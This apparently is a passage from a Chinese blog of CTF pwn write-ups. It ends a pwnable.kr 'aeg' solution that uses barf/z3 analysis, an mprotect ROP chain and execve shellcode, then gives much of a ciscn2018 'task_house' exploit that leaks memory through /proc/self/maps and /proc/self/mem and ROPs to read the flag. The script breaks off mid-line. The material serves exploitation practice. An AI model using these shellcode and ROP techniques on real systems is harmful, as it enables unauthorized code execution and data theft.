<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> basic_blocks:</span><br><span class="line">    break_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> b.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.mnemonic == <span class="string">'and'</span> <span class="keyword">and</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'eax'</span> <span class="keyword">and</span> instr.operands[<span class="number">1</span>].to_string() == <span class="string">'0x1'</span>:</span><br><span class="line">            block = b</span><br><span class="line">            break_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> break_flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这时找到的是这个块</p>
<figure class="image-box">
                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152338054.png" alt="image-20200123152338054" title class>
                <p>image-20200123152338054</p>
            </figure>

<p>其<code>taken_branch</code>和<code>not_taken_branch</code>分别是对应奇数和偶数的操作，所以：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 奇数</span></span><br><span class="line">j_num = <span class="number">0</span></span><br><span class="line">taken_block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        j_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 偶数</span></span><br><span class="line">o_num = <span class="number">0</span></span><br><span class="line">not_taken_block = find_block(block.not_taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> not_taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        o_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这里就得到了奇数和偶数分别对应的异或的值</p>
<h3 id="进入套娃函数sub-45658F0"><a href="#进入套娃函数sub-45658F0" class="headerlink" title="进入套娃函数sub_45658F0"></a>进入套娃函数<code>sub_45658F0</code></h3><p>通过之前保存的<code>not_taken_branch</code>得到该函数所在的块，第二个call就是目标函数的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">call_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        <span class="keyword">if</span> call_num == <span class="number">1</span>:</span><br><span class="line">            call_address = int(instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        call_num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="指令分析"><a href="#指令分析" class="headerlink" title="指令分析"></a>指令分析</h3><p>这里就是重磅操作了，该类函数中，几乎存在的所有操作都需要分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000045658F0                 push    rbp</span><br><span class="line">.text:00000000045658F1                 mov     rbp, rsp</span><br><span class="line">.text:00000000045658F4                 sub     rsp, 10h</span><br><span class="line">.text:00000000045658F8                 mov     ecx, esi</span><br><span class="line">.text:00000000045658FA                 mov     eax, edx</span><br><span class="line">.text:00000000045658FC                 mov     [rbp+var_4], dil</span><br><span class="line">.text:0000000004565900                 mov     [rbp+var_8], cl</span><br><span class="line">.text:0000000004565903                 mov     [rbp+var_C], al</span><br><span class="line">.text:0000000004565906                 cmp     [rbp+var_4], 0E4h</span><br><span class="line">.text:000000000456590A                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456590C                 movzx   eax, [rbp+var_4]</span><br><span class="line">.text:0000000004565910                 mov     edx, 2Bh</span><br><span class="line">.text:0000000004565915                 imul    eax, edx</span><br><span class="line">.text:0000000004565918                 sub     al, [rbp+var_8]</span><br><span class="line">.text:000000000456591B                 cmp     al, 2Eh</span><br><span class="line">.text:000000000456591D                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456591F                 movzx   edx, [rbp+var_4]</span><br><span class="line">.text:0000000004565923                 mov     eax, edx</span><br><span class="line">.text:0000000004565925                 shl     eax, 3</span><br><span class="line">.text:0000000004565928                 add     eax, edx</span><br><span class="line">.text:000000000456592A                 shl     eax, 2</span><br><span class="line">.text:000000000456592D                 mov     ecx, eax</span><br><span class="line">.text:000000000456592F                 movzx   edx, [rbp+var_8]</span><br><span class="line">.text:0000000004565933                 mov     eax, edx</span><br><span class="line">.text:0000000004565935                 shl     eax, 2</span><br><span class="line">.text:0000000004565938                 add     eax, edx</span><br><span class="line">.text:000000000456593A                 shl     eax, 3</span><br><span class="line">.text:000000000456593D                 add     eax, edx</span><br><span class="line">.text:000000000456593F                 add     eax, ecx</span><br><span class="line">.text:0000000004565941                 sub     al, [rbp+var_C]</span><br><span class="line">.text:0000000004565944                 cmp     al, 62h</span><br><span class="line">.text:0000000004565946                 jnz     short loc_456596F</span><br><span class="line">.text:0000000004565948                 movzx   eax, cs:byte_4767745</span><br><span class="line">.text:000000000456594F                 movzx   edx, al</span><br><span class="line">.text:0000000004565952                 movzx   eax, cs:byte_4767744</span><br><span class="line">.text:0000000004565959                 movzx   ecx, al</span><br><span class="line">.text:000000000456595C                 movzx   eax, cs:byte_4767743</span><br><span class="line">.text:0000000004565963                 movzx   eax, al</span><br><span class="line">.text:0000000004565966                 mov     esi, ecx</span><br><span class="line">.text:0000000004565968                 mov     edi, eax</span><br><span class="line">.text:000000000456596A                 call    sub_4565870</span><br><span class="line">.text:000000000456596F</span><br><span class="line">.text:000000000456596F loc_456596F:                            ; CODE XREF: sub_45658F0+1A↑j</span><br><span class="line">.text:000000000456596F                                         ; sub_45658F0+2D↑j ...</span><br><span class="line">.text:000000000456596F                 nop</span><br><span class="line">.text:0000000004565970                 leave</span><br><span class="line">.text:0000000004565971                 retn</span><br></pre></td></tr></table></figure>

<p>我选择分析从第四条指令开始到第三个<code>jnz</code>之前的除去<code>jnz</code>的所有操作</p>
<h4 id="预备操作"><a href="#预备操作" class="headerlink" title="预备操作"></a>预备操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">to_to = &#123;<span class="string">'eax'</span>: <span class="string">'al'</span>, <span class="string">'ebx'</span>: <span class="string">'bl'</span>, <span class="string">'ecx'</span>: <span class="string">'cl'</span>, <span class="string">'edx'</span>: <span class="string">'dl'</span>, <span class="string">'edi'</span>: <span class="string">'dil'</span>&#125;</span><br><span class="line">tv = list(to_to.values())</span><br><span class="line">tk = list(to_to.keys())</span><br></pre></td></tr></table></figure>

<p>因为这里所有涉及的运算操作都是byte为单位的，eax和al在这里并无太大运算上的区别，所以在这里做一个映射，把<code>al</code>都看作<code>eax</code>，以此类推</p>
<h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><ul>
<li><p>生成一个<code>z3</code>的<code>Solver</code></p>
</li>
<li><p>分别生成<code>eax</code>等寄存器的8位的<code>BitVec</code></p>
</li>
<li><p>设置一个字典来保存各指令的参数的值</p>
</li>
<li><p>分析各条指令，分别对<code>mov movzx add sub shl imul lea call cmp</code>指令进行分析一般来说已足够。指令分析过程要先分析出源操作数和目标操作数，如果是寄存器或者类似于<code>[rbp-4]</code>之类的，将其视为一个变量名，并检查参数字典中是否有该变量。如果有，则取出作为操作数，如果无，则生成以变量名为名的8位<code>BitVec</code>，然后依据相应指令所做的操作进行运算</p>
</li>
<li><p>指令的操作类型非常有限，这就为我们的分析提供了非常有利的条件</p>
</li>
<li><p>遇到第三个jnz的时候，其后所有指令除了<code>call</code>以外全部跳过</p>
</li>
<li><p>分析到<code>call</code>的时候，取出<code>call</code>的地址，然后再来一轮针对该<code>call</code>的分析</p>
</li>
<li><p>分析到<code>memcpy</code>的时候，分析得到<code>dest</code>距离<code>rbp</code>的距离，存为变量size</p>
</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = []</span><br><span class="line">size = <span class="number">0</span>	<span class="comment"># dest相对rbp的距离</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = Solver()</span><br><span class="line">    eax = BitVec(<span class="string">'eax'</span>, <span class="number">8</span>)</span><br><span class="line">    ebx = BitVec(<span class="string">'ebx'</span>, <span class="number">8</span>)</span><br><span class="line">    ecx = BitVec(<span class="string">'ecx'</span>, <span class="number">8</span>)</span><br><span class="line">    edx = BitVec(<span class="string">'edx'</span>, <span class="number">8</span>)</span><br><span class="line">    edi = BitVec(<span class="string">'edi'</span>, <span class="number">8</span>)</span><br><span class="line">    esi = BitVec(<span class="string">'esi'</span>, <span class="number">8</span>)</span><br><span class="line">    V = &#123;<span class="string">'eax'</span>: eax, <span class="string">'ebx'</span>: ebx, <span class="string">'ecx'</span>: ecx,</span><br><span class="line">         <span class="string">'edx'</span>: edx, <span class="string">'edi'</span>: edi, <span class="string">'esi'</span>: esi&#125;</span><br><span class="line">    log(<span class="string">"exec call"</span>, call_address)</span><br><span class="line">    cfg = barf.recover_cfg(start=call_address)</span><br><span class="line">    <span class="keyword">if</span> len(cfg.basic_blocks) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> instr <span class="keyword">in</span> cfg.basic_blocks[<span class="number">0</span>].instrs:</span><br><span class="line">            <span class="keyword">if</span> instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                op2 = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">                obj = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">                s = obj.groups()[<span class="number">0</span>]</span><br><span class="line">                size = int(s.strip(<span class="string">' '</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>], <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">        print(<span class="string">"[+] reach the target!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    continue_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> addr, asm_instr, reil_instrs <span class="keyword">in</span> barf.translate(cfg.start_address+<span class="number">8</span>, cfg.end_address):</span><br><span class="line">        <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(s.check(), z3.z3.CheckSatResult):</span><br><span class="line">                md = s.model()</span><br><span class="line">                print(md)</span><br><span class="line">                edi_val = md.eval(edi).as_long()</span><br><span class="line">                esi_val = md.eval(esi).as_long()</span><br><span class="line">                edx_val = md.eval(edx).as_long()</span><br><span class="line">                log(<span class="string">"found 0: "</span>, edi_val)</span><br><span class="line">                log(<span class="string">"found 1: "</span>, esi_val)</span><br><span class="line">                log(<span class="string">"found 2: "</span>, edx_val)</span><br><span class="line">                ans.append(edi_val)</span><br><span class="line">                ans.append(esi_val)</span><br><span class="line">                ans.append(edx_val)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"[-] unsat!"</span>)</span><br><span class="line">            call_address = int(asm_instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            s.reset()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(asm_instr.operands) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            op1 = asm_instr.operands[<span class="number">0</span>].to_string()</span><br><span class="line">            op2 = asm_instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">            <span class="keyword">if</span> op1 <span class="keyword">in</span> tv:</span><br><span class="line">                op1 = tk[tv.index(op1)]</span><br><span class="line">            <span class="keyword">if</span> op2 <span class="keyword">in</span> tv:</span><br><span class="line">                op2 = tk[tv.index(op2)]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'rip'</span> <span class="keyword">in</span> op2:</span><br><span class="line">                continue_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> continue_flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            Sobj1 = re.search(<span class="string">r"\[(\S+)\]"</span>, op1)</span><br><span class="line">            <span class="keyword">if</span> is_num(op2):</span><br><span class="line">                var2_var = int(op2, <span class="number">16</span>)</span><br><span class="line">                V[op2] = var2_var</span><br><span class="line">                Sobj2 = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Sobj2 = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">            <span class="keyword">if</span> Sobj1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var1_name = op1</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_name = Sobj1.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var1_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var1_var = V[var1_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_var = BitVec(var1_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> Sobj2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var2_name = op2</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_name = Sobj2.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var2_var = V[var2_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'mov'</span> <span class="keyword">or</span> asm_instr.mnemonic == <span class="string">'movzx'</span>:</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'cmp'</span>:</span><br><span class="line">                s.add(var1_var == var2_var)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'add'</span>:</span><br><span class="line">                var1_var += var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'sub'</span>:</span><br><span class="line">                var1_var -= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'imul'</span>:</span><br><span class="line">                var1_var *= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'shl'</span>:</span><br><span class="line">                var1_var &lt;&lt;= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'*'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'*'</span>)</span><br><span class="line">                    var2_name = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                        var2_var = V[var2_name]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">                    var2_var *= int(vs[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'+'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'+'</span>)</span><br><span class="line">                    v1 = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    v2 = vs[<span class="number">1</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> v1 <span class="keyword">in</span> tk:</span><br><span class="line">                        var1 = V[v1]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var1 = int(v1, <span class="number">16</span>)</span><br><span class="line">                    <span class="keyword">if</span> v2 <span class="keyword">in</span> tk:</span><br><span class="line">                        var2 = V[v2]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2 = int(v2, <span class="number">16</span>)</span><br><span class="line">                    var2_var = var1</span><br><span class="line">                    var2_var += var2</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            V[var1_name] = var1_var</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>程序非常贴心地导入了mprotect</strong>，所以我们可以通过利用<code>mprotect</code>将加密后数据的地址所存在的页的属性变为<code>RWX</code>，然后跳入这里执行<code>shellcode</code>完成利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(binary_name)</span><br><span class="line">gadget = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ans]).ljust(len(ans)+size, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(init_addr1)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, elf.got[<span class="string">'mprotect'</span>], <span class="number">7</span>, <span class="number">0x1000</span>, inp_address&amp;(~<span class="number">0xfff</span>))</span><br><span class="line">gadget += p64(init_addr2) + p64(<span class="number">0</span>)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, inp_address+<span class="number">0x200</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">gadget += p64(init_addr2)</span><br><span class="line">gadget = gadget.ljust(<span class="number">0x200</span>, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(inp_address+<span class="number">0x208</span>)</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">    mov rdi, 0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    lea rdi, [rsp]</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, SYS_execve</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">gadget = gadget + shellcode</span><br></pre></td></tr></table></figure>

<p>最后不能忘了还要将<code>payload</code>解密，编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(gadget)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ j_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ o_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    payload += c</span><br><span class="line">    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>就可以<code>get shell</code>了</p>
<p>脚本在[Github]([<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]</a>(<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr</a> aeg/aeg.py))</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做出这道题之前，本打算用angr来解题，但是由于对angr的API不熟悉，学习成本很大，因此改用我相对熟悉的barf来辅助分析，收获不算颇丰，但做出这道题挺舒服的</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>aeg</tag>
      </tags>
  </entry>
  <entry>
    <title>需要读取maps和mem文件的pwn</title>
    <url>/2019/12/19/%E9%9C%80%E8%A6%81%E8%AF%BB%E5%8F%96maps%E5%92%8Cmem%E6%96%87%E4%BB%B6%E7%9A%84pwn/</url>
    <content><![CDATA[<p>这道题是ciscn2018的一道pwn，其中需要读取<code>/proc/self/maps</code>文件和<code>/proc/self/mem</code>文件和<code>/proc/self/mem</code>文件</p>
<p>文件都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/ciscn2018%20task_house" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/home/dajun/binary/pwn_question/heap/ciscn2018 task_house/task_house'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>仅限制不能打开flag文件，以及栈溢出</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><ul>
<li><p>打开<code>/proc/self/maps</code>文件，能得到elf基地址以及clone出的线程的栈地址</p>
</li>
<li><p>打开<code>/proc/self/mem</code>文件，扫描搜索我们得到的栈地址的内存空间，如果其中存在<code>/proc/self/mem</code>字符串则代表我们找到了当前栈空间</p>
</li>
<li><p>通过打开文件的函数进行栈溢出，将栈上存储的<code>malloc</code>出的地址修改为<code>read</code>函数返回地址所对应的栈地址</p>
</li>
<li><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"What do you want to give me?"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"content: "</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>通过这个函数对<code>v8</code>即我们已经修改的地址写rop链，read函数返回的时候就会直接rop</p>
</li>
</ul>
<p>因为它本身有四个文件描述符：<code>stdin</code>，<code>stdout</code>，<code>stderr</code>，<code>/dev/urandom</code></p>
<p>而我们又打开了两个文件：<code>/proc/self/maps</code>，<code>/proc/self/mem</code></p>
<p>所以我们rop的时候打开的flag文件的文件描述符是6</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x:log.success(x)</span><br><span class="line">io = <span class="number">0</span></span><br><span class="line">binary = <span class="string">'./task_house'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(name)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">'finding?\n'</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span><span class="params">(locate)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">'you?\n'</span>)</span><br><span class="line">    sl(str(locate))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(n)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">'get?\n'</span>)</span><br><span class="line">    sl(str(n))</span><br><span class="line">    ru(<span class="string">'something:\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> rn(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span><span class="params">(cont)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">'content: \n'</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = process(binary)</span><br><span class="line">    ru(<span class="string">'Y/n?\n'</span>)</span><br><span class="line">    sl(<span class="string">'y'</span>)</span><br><span class="line">    find(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">    rv = get(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    elf_base = int(rv[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">    pop_rdi = elf_base + <span class="number">0x1823</span></span><br><span class="line">    pop_rsi = elf_base + <span class="number">0x1821</span></span><br><span class="line">    stack_start = int(rv[<span class="number">506</span>:<span class="number">518</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#stack_start = int(rv[530:542], 16)</span></span><br><span class="line">    success(<span class="string">"stack address: 0x%x\nelf base: 0x%x"</span> %(stack_start, elf_base))</span><br><span class="line">    stack_size = <span class="number">0x10000000</span></span><br><span class="line">    how_many = <span class="number">100000</span></span><br><span class="line"></span><br><span class="line">    stack_start = stack_start + <span class="number">0x150000</span>	<span class="comment">#这个是我瞎写的一个偏移</span></span><br><span class="line"></span><br><span class="line">    find(<span class="string">"/proc/self/mem"</span>)</span><br><span class="line">    locate(stack_start)</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):		<span class="comment"># 在24轮里面搜索栈空间</span></span><br><span class="line">        cont = get(how_many)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'/proc/self/mem'</span> <span class="keyword">in</span> cont:</span><br><span class="line">            count = i</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pos = cont.index(<span class="string">'/proc/self/mem'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    str_pos = pos + stack_start + how_many * count</span><br><span class="line">    read_ret_pos = str_pos - <span class="number">0x38</span></span><br><span class="line">    success(<span class="string">"ret address: 0x%x\nstr pos: 0x%x"</span> %(read_ret_pos, str_pos))</span><br><span class="line">    payload = <span class="string">"/proc/self/mem"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(read_ret_pos)</span><br><span class="line">    find(payload)	<span class="comment"># 把v8的地址修改成read_ret_pos</span></span><br><span class="line">    flag_address = read_ret_pos + <span class="number">15</span>*<span class="number">8</span></span><br><span class="line">    open_address = elf_base + <span class="number">0xC00</span></span><br><span class="line">    read_address = elf_base + <span class="number">0xBA0</span></span><br><span class="line">    puts_address = elf_base + <span class="number">0xB00</span></span><br><span class="line">    payload = p64(pop_rdi) + p64(flag_address) + p64(pop_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(open_address) + p64(pop_rdi) + p64(<span class="number">6</span>) + p64(pop_rsi) + p64(flag_address) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(read_address) + p64(pop_rdi) + p64(flag_address) + p64(puts_address)</span><br><span class="line">    payload += <span class="string">"flag\x00"</span></span><br><span class="line">    give(payload)	<span 